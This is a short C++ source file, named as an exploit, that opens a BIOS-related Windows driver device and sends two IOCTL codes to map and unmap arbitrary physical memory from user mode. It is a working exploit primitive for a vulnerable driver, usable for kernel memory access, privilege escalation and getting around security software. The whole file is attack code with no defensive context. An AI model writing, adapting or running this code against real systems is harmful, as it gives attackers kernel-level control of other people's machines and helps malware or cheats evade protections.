#include "WnBios64Exploit.h"

#include <string_view>

namespace WnBios64Exploit
{
	constexpr std::string_view g_driverControlName{ "\\\\.\\WNBIOS" };

	HANDLE g_driverHandle = INVALID_HANDLE_VALUE;

	bool openDriver()
	{
		g_driverHandle = CreateFileA(g_driverControlName.data(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
		return g_driverHandle != INVALID_HANDLE_VALUE;
	}

	bool mapPhysicalMemory(uintptr_t address, uintptr_t size, HANDLE* outSection, PVOID* outSectionAddress, PVOID* outObjectAddress)
	{
		__try
		{
			WnBiosMemoryData memory;
			ZeroMemory(&memory, sizeof(memory));

			memory.size = size;
			memory.address = address;

			DWORD returnSize;
			auto status = DeviceIoControl(g_driverHandle, 0x80102040, &memory, sizeof(WnBiosMemoryData), &memory, sizeof(WnBiosMemoryData), &returnSize, 0);
			if (!status)
				return false;

			*outSection = memory.section;
			*outSectionAddress = memory.sectionAddr;
			*outObjectAddress = memory.objectAddr;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			return false;
		}

		return true;
	}

	bool unmapPhysicalMemory(HANDLE section, PVOID sectionAddress, PVOID objectAddress)
	{
		__try
		{
			WnBiosMemoryData memory;
			ZeroMemory(&memory, sizeof(memory));
			memory.section = section;
			memory.sectionAddr = sectionAddress;
			memory.objectAddr = objectAddress;

			DWORD bytes_returned;
			auto status = DeviceIoControl(g_driverHandle, 0x80102044, &memory, sizeof(WnBiosMemoryData), 0, 0, &bytes_returned, 0);
			if (!status)
				return false;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			return false;
		}

		return true;
	}
}
